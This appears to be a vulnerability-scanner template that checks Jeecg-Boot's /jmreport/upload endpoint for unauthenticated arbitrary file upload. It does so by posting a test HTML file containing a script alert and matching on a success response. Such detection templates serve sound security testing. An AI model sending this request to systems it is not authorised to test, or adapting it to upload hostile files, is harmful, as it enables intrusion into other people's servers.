id: jeecg-boot-unauth-file-upload

info:
  name: Jeecg-Boot Arbitrary File Upload
  author: ProjectDiscoveryAI
  severity: high
  description: |
    Jeecg-Boot's /jmreport/upload endpoint allows unauthenticated arbitrary file upload.
    This template checks for this vulnerability by uploading a test HTML file.
  tags: file-upload,unauthenticated

http:
  - raw:
      - |
        POST /jeecg-boot/jmreport/upload HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

        ------WebKitFormBoundary
        Content-Disposition: form-data; name="file"; filename="test.html"
        Content-Type: text/html

        <html><body><script>alert('XSS');</script></body></html>
        ------WebKitFormBoundary--

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"success":true'